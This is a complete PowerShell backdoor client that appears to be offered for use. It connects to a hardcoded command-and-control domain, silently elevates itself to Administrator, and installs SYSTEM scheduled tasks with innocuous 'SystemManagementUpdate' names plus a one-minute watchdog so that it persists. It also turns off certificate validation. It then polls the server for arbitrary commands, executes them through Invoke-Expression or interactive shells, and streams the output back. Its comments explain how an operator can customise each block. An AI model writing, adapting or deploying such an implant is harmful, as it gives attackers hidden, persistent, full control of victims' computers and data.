# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  CONFIGURATION                                                             ║
# ║  Edit these values to match your setup. All features reference these vars. ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$cfHost = "https://connect.aniketpandey.website"
$maxRetries = 10
$cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
$maxChunkBytes = 32000  # cap per-chunk size
$clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  SELF-PATH RESOLUTION                                                      ║
# ║  Determines script location for logging, persistence, and EXE detection.   ║
# ║  Required by: LOGGING, PERSISTENCE, ADMIN ELEVATION                        ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$selfPath = $PSCommandPath
if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
if (-not $selfPath) { $selfPath = (Get-Process -Id $PID).Path }
$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } elseif ($selfPath) { Split-Path -Parent $selfPath } else { $env:TEMP }
$isExePayload = ($selfPath -and [System.IO.Path]::GetExtension($selfPath).ToLower() -eq ".exe")

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  SINGLE-INSTANCE MUTEX                                                     ║
# ║  Prevents duplicate copies from running simultaneously.                    ║
# ║  Safe to remove if you don't use the watchdog task.                        ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$mutexName = "Global\SystemManagementUpdateMutex"
$createdNew = $false
$script:singleInstanceMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
if (-not $createdNew) { exit }

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  ADMIN ELEVATION                                                           ║
# ║  Re-launches itself as Administrator in a hidden window if not already.    ║
# ║  Required by: PERSISTENCE (needs admin to register SYSTEM tasks)           ║
# ║  To remove: delete this block; script will run as current user.            ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    if ($isExePayload) {
        Start-Process -FilePath $selfPath -Verb RunAs -WindowStyle Hidden
    } else {
        Start-Process PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
    }
    exit
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  PERSISTENCE (Scheduled Tasks)                                             ║
# ║  Two tasks: main (startup+logon) + watchdog (every 1 min).                ║
# ║  Survives: reboot, shutdown, user killing process from Task Manager.       ║
# ║  To remove: delete this block, and also remove $taskName/$watchdogTaskName ║
# ║  from CONFIGURATION. Script will run only once until manually restarted.   ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$taskName = "SystemManagementUpdate"
$watchdogTaskName = "SystemManagementUpdateWatchdog"
$action = if ($isExePayload) {
    New-ScheduledTaskAction -Execute $selfPath
} else {
    New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
}
$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $startupTrigger = New-ScheduledTaskTrigger -AtStartup
    $logonTrigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($startupTrigger, $logonTrigger) -Settings $settings -Principal $principal -Force | Out-Null
}
if (-not (Get-ScheduledTask -TaskName $watchdogTaskName -ErrorAction SilentlyContinue)) {
    $watchdogAction = if ($isExePayload) {
        New-ScheduledTaskAction -Execute $selfPath
    } else {
        New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
    }
    $watchdogTrigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
    Register-ScheduledTask -TaskName $watchdogTaskName -Action $watchdogAction -Trigger $watchdogTrigger -Settings $settings -Principal $principal -Force | Out-Null
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  LOGGING (shell.txt)                                                       ║
# ║  Writes timestamped logs to shell.txt beside the script.                   ║
# ║  Auto-rotates at 5 MB. Safe to remove entirely — replace all Write-Log    ║
# ║  calls with nothing. Also remove $logFile and $maxLogSizeMB from CONFIG.   ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$logFile = Join-Path $scriptDir "shell.txt"
$maxLogSizeMB = 5
$retryCount = 0

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] [$Level] $Message"
    try {
        if (Test-Path $logFile) {
            $size = (Get-Item $logFile).Length / 1MB
            if ($size -ge $maxLogSizeMB) {
                Move-Item -Path $logFile -Destination "$logFile.old" -Force
            }
        }
        Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
    } catch {}
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  TLS + SSL CERTIFICATE BYPASS                                             ║
# ║  Enables TLS 1.2/1.3 and bypasses cert validation for SYSTEM account.     ║
# ║  SYSTEM's cert store lacks Cloudflare root CAs — this fixes SSL errors.   ║
# ║  To remove: delete this block. Only safe if running as a normal user       ║
# ║  whose cert store trusts your C2 domain's certificate chain.               ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
[System.Net.ServicePointManager]::Expect100Continue = $false
try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch {
    try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {}
}
try {
    if (-not ([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type) {
        Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
    }
    [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
} catch {
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  HTTP HELPERS                                                              ║
# ║  Core transport layer — sends/receives data to the C2 server.             ║
# ║  Do NOT remove — required by STREAMING EXECUTION and MAIN LOOP.           ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
function Send-Http {
    param([string]$Url, [string]$Method = "GET", [string]$Body = $null, [int]$TimeoutMs = 10000)
    $req = [System.Net.HttpWebRequest]::Create($Url)
    $req.Method = $Method
    $req.UserAgent = "Mozilla/5.0"
    $req.KeepAlive = $true
    $req.Timeout = $TimeoutMs
    $req.ReadWriteTimeout = $TimeoutMs
    if ($Method -eq "POST" -and $Body) {
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        if ($bodyBytes.Length -gt $maxChunkBytes) {
            $Body = [System.Text.Encoding]::UTF8.GetString($bodyBytes, 0, $maxChunkBytes) + "`n[...truncated]"
        }
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $req.ContentType = "text/plain; charset=utf-8"
        $req.ContentLength = $bytes.Length
        $stream = $req.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
    }
    $resp = $req.GetResponse()
    $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
    $result = $reader.ReadToEnd().Trim()
    $reader.Close()
    $resp.Close()
    return $result
}

function Get-Command-From-Server {
    try { return Send-Http -Url "$cfHost/cmd?id=$clientId" } catch { throw $_ }
}

function Get-Signal-From-Server {
    try { return Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000 } catch { return "" }
}

function Send-Stream-To-Server {
    param([string]$Body)
    try { Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $Body | Out-Null }
    catch { Write-Log "Stream send failed: $($_.Exception.Message)" "WARN" }
}

function Send-Result-To-Server {
    param([string]$Body)
    try { Send-Http -Url "$cfHost/result?id=$clientId" -Method "POST" -Body $Body | Out-Null }
    catch { Write-Log "Result send failed: $($_.Exception.Message)" "WARN" }
}

function Get-Stdin-From-Server {
    try { return Send-Http -Url "$cfHost/stdin?id=$clientId" -TimeoutMs 3000 } catch { return "" }
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  PERSISTENT RUNSPACE                                                       ║
# ║  Keeps a single PowerShell runspace alive across commands so state (cd,    ║
# ║  variables, modules) persists between commands.                            ║
# ║  Do NOT remove — required by STREAMING EXECUTION.                         ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$script:persistentRunspace = $null

function Get-PersistentRunspace {
    if ($null -eq $script:persistentRunspace -or $script:persistentRunspace.RunspaceStateInfo.State -ne 'Opened') {
        try { if ($script:persistentRunspace) { $script:persistentRunspace.Dispose() } } catch {}
        $script:persistentRunspace = [runspacefactory]::CreateRunspace()
        $script:persistentRunspace.Open()
        Write-Log "Created new persistent runspace"
    }
    return $script:persistentRunspace
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  INTERACTIVE PROCESS EXECUTION                                               ║
# ║  Runs truly interactive binaries (cmd/python/etc.) with redirected stdin/   ║
# ║  stdout/stderr. stdin is pulled from /stdin and streamed to the process.    ║
# ║  Supports timeout + cancel exactly like normal command execution.            ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
function Invoke-InteractiveCommand {
    param(
        [string]$Command,
        [bool]$NoTimeout = $false,
        [int]$Timeout = $cmdTimeout
    )

    $timeoutLabel = if ($NoTimeout) { "no-timeout" } else { "${Timeout}s" }
    $runspace = Get-PersistentRunspace
    try {
        $cwdPs = [powershell]::Create()
        $cwdPs.Runspace = $runspace
        $cwdValues = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
        $cwdPs.Dispose()
        $cwd = if ($cwdValues) { @($cwdValues)[0] } else { (Get-Location).Path }
    } catch { $cwd = (Get-Location).Path }

    Send-Stream-To-Server -Body "PS $cwd> $Command [$timeoutLabel] [interactive]`n"

    $parts = $Command.Trim() -split '\s+', 2
    $exe = $parts[0]
    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }

    # Resolve full path so SYSTEM account finds user-installed binaries
    try {
        $resolved = (Get-Command $exe -ErrorAction Stop).Source
        if ($resolved) { $exe = $resolved }
    } catch {
        # Fallback: search common user-install dirs that SYSTEM's PATH may lack
        $searchDirs = @(
            "$env:ProgramFiles", "${env:ProgramFiles(x86)}",
            "$env:SystemRoot\System32",
            "$env:LOCALAPPDATA\Programs\Python", "$env:LOCALAPPDATA\Programs",
            "$env:ProgramFiles\Python*", "$env:ProgramFiles\nodejs"
        )
        foreach ($dir in $searchDirs) {
            $candidates = Get-ChildItem -Path $dir -Filter "$exe.exe" -Recurse -Depth 2 -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($candidates) { $exe = $candidates.FullName; break }
        }
    }

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exe
    $psi.Arguments = $args
    $psi.WorkingDirectory = $cwd
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.RedirectStandardInput = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true

    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $psi

    $streamQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()

    try {
        if (-not $proc.Start()) {
            Send-Result-To-Server -Body "[!] Failed to start interactive command: $Command`n"
            return
        }
    } catch {
        Send-Result-To-Server -Body ("[!] Failed to start interactive command: " + $_.Exception.Message + "`n")
        return
    }

    $outEvent = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -MessageData $streamQueue -Action {
        if ($EventArgs.Data -ne $null) { $Event.MessageData.Enqueue($EventArgs.Data + "`n") }
    }
    $errEvent = Register-ObjectEvent -InputObject $proc -EventName ErrorDataReceived -MessageData $streamQueue -Action {
        if ($EventArgs.Data -ne $null) { $Event.MessageData.Enqueue($EventArgs.Data + "`n") }
    }
    $proc.BeginOutputReadLine()
    $proc.BeginErrorReadLine()

    $startTime = Get-Date
    $idleCycles = 0
    $cancelled = $false
    $timedOut = $false

    while (-not $proc.HasExited) {
        $chunk = ""
        $line = $null
        while ($streamQueue.TryDequeue([ref]$line)) {
            $chunk += $line
        }
        if ($chunk.Length -gt 0) {
            Send-Stream-To-Server -Body $chunk
            $idleCycles = 0
        } else {
            $idleCycles++
        }

        $stdinData = Get-Stdin-From-Server
        if ($stdinData) {
            foreach ($stdinLine in ($stdinData -split "`n")) {
                $cleanLine = $stdinLine.TrimEnd("`r")
                try { $proc.StandardInput.WriteLine($cleanLine) } catch {}
            }
            try { $proc.StandardInput.Flush() } catch {}
        }

        $signal = Get-Signal-From-Server
        if ($signal -eq "cancel") {
            try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
            $cancelled = $true
            break
        }

        if (-not $NoTimeout) {
            $elapsed = ((Get-Date) - $startTime).TotalSeconds
            if ($elapsed -gt $Timeout) {
                try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
                $timedOut = $true
                break
            }
        }

        $sleepMs = if ($idleCycles -le 0) { 200 } elseif ($idleCycles -le 5) { 500 } else { 1000 }
        Start-Sleep -Milliseconds $sleepMs
    }

    try { $proc.WaitForExit(1000) | Out-Null } catch {}

    $finalChunk = ""
    $line = $null
    while ($streamQueue.TryDequeue([ref]$line)) {
        $finalChunk += $line
    }

    if ($cancelled) {
        Send-Result-To-Server -Body ($finalChunk + "[!] Command cancelled by operator.`n")
        Write-Log "Interactive command cancelled: $Command" "INFO"
    } elseif ($timedOut) {
        Send-Result-To-Server -Body ($finalChunk + "[!] Command timed out after ${Timeout}s.`n")
        Write-Log "Interactive command timed out: $Command" "WARN"
    } else {
        Send-Result-To-Server -Body $finalChunk
    }

    try { $proc.CancelOutputRead() } catch {}
    try { $proc.CancelErrorRead() } catch {}
    try { Unregister-Event -SourceIdentifier $outEvent.Name -ErrorAction SilentlyContinue } catch {}
    try { Unregister-Event -SourceIdentifier $errEvent.Name -ErrorAction SilentlyContinue } catch {}
    try { Remove-Job -Id $outEvent.Id -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Job -Id $errEvent.Id -Force -ErrorAction SilentlyContinue } catch {}
    try { $proc.StandardInput.Close() } catch {}
    try { $proc.Dispose() } catch {}
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  STREAMING EXECUTION                                                       ║
# ║  Runs commands asynchronously with real-time output streaming back to      ║
# ║  the server. Supports: timeout, notimeout: prefix, cancel signal.         ║
# ║  Do NOT remove — this is the core command execution engine.               ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
function Invoke-CommandStreaming {
    param([string]$Command, [int]$Timeout = $cmdTimeout)

    # --- notimeout: prefix support (removable) ---
    $noTimeout = $false
    if ($Command -match '^notimeout:(.+)$') {
        $Command = $Matches[1].Trim()
        $noTimeout = $true
    }
    # --- end notimeout ---

    # --- INTERACTIVE COMMAND DETECTION (routes to Invoke-InteractiveCommand) ---
    $interactiveList = @('cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe',
                         'python', 'python3', 'python.exe', 'node', 'node.exe',
                         'nslookup', 'ftp', 'telnet', 'wsl', 'bash',
                         'diskpart', 'debug', 'edit', 'edlin')
    $firstToken = ($Command.Trim() -split '\s+', 2)[0].ToLower()
    $hasArgs = ($Command.Trim() -split '\s+').Count -gt 1
    if ($interactiveList -contains $firstToken -and -not $hasArgs) {
        Invoke-InteractiveCommand -Command $Command -NoTimeout $noTimeout -Timeout $Timeout
        return
    }
    # --- end interactive detection ---

    # 1) Send header — read cwd from persistent runspace (reflects cd changes)
    $timeoutLabel = if ($noTimeout) { "no-timeout" } else { "${Timeout}s" }
    $runspace = Get-PersistentRunspace
    try {
        $cwdPs = [powershell]::Create()
        $cwdPs.Runspace = $runspace
        $cwdValues = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
        $cwdPs.Dispose()
        $cwd = if ($cwdValues) { @($cwdValues)[0] } else { (Get-Location).Path }
    } catch { $cwd = (Get-Location).Path }
    $header = "PS $cwd> $Command [$timeoutLabel]`n"
    Send-Stream-To-Server -Body $header

    # 2) Use persistent runspace (reused across commands)
    $ps = [powershell]::Create()
    $ps.Runspace = $runspace

    $ps.AddScript(@"
        try {
            Invoke-Expression `$args[0] 2>&1 | Out-String -Stream
        } catch {
            "Error: " + `$_.Exception.Message
        }
"@).AddArgument($Command) | Out-Null

    $outputCollection = [System.Management.Automation.PSDataCollection[PSObject]]::new()
    $inputCollection = [System.Management.Automation.PSDataCollection[PSObject]]::new()
    $inputCollection.Complete()

    $handle = $ps.BeginInvoke($inputCollection, $outputCollection)

    $lastIndex = 0
    $startTime = Get-Date
    $finished = $false
    $idleCycles = 0

    # 3) Adaptive streaming loop — drain output + check cancel/timeout
    while (-not $handle.IsCompleted) {
        $sleepMs = if ($idleCycles -le 0) { 200 } elseif ($idleCycles -le 5) { 500 } else { 1000 }
        Start-Sleep -Milliseconds $sleepMs

        # Drain new output lines
        $currentCount = $outputCollection.Count
        if ($currentCount -gt $lastIndex) {
            $idleCycles = 0
            $chunk = ""
            for ($i = $lastIndex; $i -lt $currentCount; $i++) {
                $chunk += [string]$outputCollection[$i] + "`n"
            }
            $lastIndex = $currentCount
            if ($chunk.Length -gt 0) {
                Send-Stream-To-Server -Body $chunk
            }
        } else {
            $idleCycles++
        }

        # --- TIMEOUT CHECK (removable — commands will run indefinitely) ---
        if (-not $noTimeout) {
            $elapsed = ((Get-Date) - $startTime).TotalSeconds
            if ($elapsed -gt $Timeout) {
                $ps.Stop()
                Send-Result-To-Server -Body "[!] Command timed out after ${Timeout}s.`n"
                Write-Log "Command timed out: $Command" "WARN"
                $finished = $true
                break
            }
        }
        # --- end timeout check ---

        # --- CANCEL SIGNAL CHECK (removable — operator won't be able to cancel) ---
        $signal = Get-Signal-From-Server
        if ($signal -eq "cancel") {
            $ps.Stop()
            Send-Result-To-Server -Body "[!] Command cancelled by operator.`n"
            Write-Log "Command cancelled: $Command" "INFO"
            $finished = $true
            break
        }
        # --- end cancel signal ---
    }

    # 4) Drain remaining output and send as final result
    if (-not $finished) {
        $currentCount = $outputCollection.Count
        $chunk = ""
        if ($currentCount -gt $lastIndex) {
            for ($i = $lastIndex; $i -lt $currentCount; $i++) {
                $chunk += [string]$outputCollection[$i] + "`n"
            }
        }
        Send-Result-To-Server -Body $chunk
    }

    # 5) Cleanup (only dispose the PowerShell instance, NOT the shared runspace)
    try { $ps.Dispose() } catch {}
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  MAIN LOOP                                                                ║
# ║  Polls the server for commands, executes them, and reconnects on failure. ║
# ║  Adaptive polling: 1s → 3s → 5s when idle. Exponential backoff on error. ║
# ║  Do NOT remove — this is the entry point.                                 ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
function Connect-Cloudflare {
    $activeDelay   = 300
    $idleStep1     = 1000
    $idleStep2     = 3000
    $idleStep3     = 5000
    $consecutiveIdle = 0

    Write-Log "Client started. PID=$PID. Connecting to $cfHost"

    while ($true) {
        try {
            $command = Get-Command-From-Server

            if ($command -and $command -ne "") {
                $retryCount = 0
                $consecutiveIdle = 0

                Write-Log "CMD: $command"

                if ($command -eq "exit") {
                    Write-Log "Exit command received. Shutting down."
                    try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
                    try { $script:singleInstanceMutex.Dispose() } catch {}
                    break
                }

                Invoke-CommandStreaming -Command $command

                Start-Sleep -Milliseconds $activeDelay
            }
            else {
                $consecutiveIdle++
                $delay = if ($consecutiveIdle -le 10) { $idleStep1 }
                         elseif ($consecutiveIdle -le 50) { $idleStep2 }
                         else { $idleStep3 }
                Start-Sleep -Milliseconds $delay
            }
        }
        catch {
            $retryCount++
            Write-Log "Connection error #$retryCount : $($_.Exception.Message)" "ERROR"

            $backoff = [Math]::Min(60, [Math]::Pow(2, $retryCount))
            Start-Sleep -Seconds $backoff

            if ($retryCount -ge $maxRetries) {
                Write-Log "Max retries ($maxRetries) hit. Resetting counter." "WARN"
                $retryCount = 0
            }
        }
    }
}

Connect-Cloudflare
